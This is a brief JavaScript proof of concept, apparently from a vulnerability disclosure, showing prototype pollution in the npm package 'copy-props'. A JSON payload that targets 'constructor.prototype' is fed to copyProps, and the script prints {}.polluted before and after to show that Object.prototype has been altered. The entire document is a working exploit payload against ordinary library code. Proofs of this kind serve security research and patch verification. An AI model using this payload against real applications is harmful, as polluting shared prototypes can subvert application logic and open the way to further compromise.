Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const copyProps = require('copy-props');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
copyProps(JSON.parse(malicious_payload), {});
console.log({}.polluted);